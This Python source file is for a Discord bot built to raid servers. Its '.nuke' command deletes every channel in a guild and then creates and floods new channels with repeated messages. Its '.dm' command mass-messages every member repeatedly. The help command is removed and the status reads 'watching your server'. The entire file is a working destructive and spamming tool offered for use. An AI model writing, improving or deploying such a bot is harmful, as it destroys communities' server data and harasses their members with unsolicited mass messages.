# packages
import discord
from discord.ext import commands
import asyncio
from dotenv import load_dotenv
import os
import requests
import json

# config
load_dotenv()
TOKEN = os.getenv("TOKEN")

config = {
    "Prefix": ".",
    "Status": os.getenv("STATUS", "your server"),
}

# intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=config["Prefix"], intents=intents)


# events
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} ({bot.user.id})")
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.watching, name=config["Status"]
        ),
    )

    print(
        f"Invite: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=157712&scope=bot"
    )

    print("\n----LOGS----\n")


@bot.event
async def on_command_error(ctx, error):
    await ctx.send(error)
    print(f"[ERROR] {error}")


# commands
@bot.command()
async def nuke(ctx, channelCount, messages, channelName, *, message):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel {channel.name}")

        except Exception as e:
            print(f"Couldn't delete channel {channel.name}: {e}")

    for i in range(int(channelCount)):
        try:
            channel = await ctx.guild.create_text_channel(name=channelName)
            print(f"Created text channel: {channelName}")

            for j in range(int(messages)):
                await channel.send(message)
        except Exception as e:
            print(f"Couldn't create text channel {channelName}: {e}")


@bot.command()
async def dm(ctx, amount, *, message):
    for i in range(int(amount)):
        for member in ctx.guild.members:
            try:
                await member.send(message)
                print("Sent to {member.display_name} ({member.id}).")
            except discord.Forbidden:
                print(
                    f"Couldn't send a message to {member.display_name} ({member.id}). They may have DMs disabled or have blocked the bot."
                )
            except Exception as e:
                print(
                    f"An error occurred while sending a message to {member.display_name} ({member.id}): {e}"
                )


bot.remove_command("help")


bot.run(TOKEN)
